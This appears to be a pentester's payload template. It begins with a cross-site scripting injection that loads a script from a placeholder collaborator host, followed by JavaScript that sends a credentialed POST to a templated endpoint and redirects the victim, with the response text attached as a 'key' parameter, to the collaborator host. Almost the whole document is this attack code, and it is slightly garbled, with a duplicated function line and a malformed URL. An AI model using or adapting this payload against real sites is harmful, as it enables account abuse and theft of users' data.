/Firstly, made a XSS, for example: "><script src=https://{COLLABORATOR}/test.js></script>

function submitRequest()
      {
        var xhr = new XMLHttpRequest();
	xhr.onload = xhrListener;
        xhr.open("POST", "{FULL_PATH_TO_THE_ENDPOINT}", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
      function submitRequest()
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
        xhr.withCredentials = true;
        var body = "{BODY_PARAMS}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
        function xhrListener() {
        location='https:///{COLLABORATOR}/exploit?key='+this.responseText;};
      }
      submitRequest();
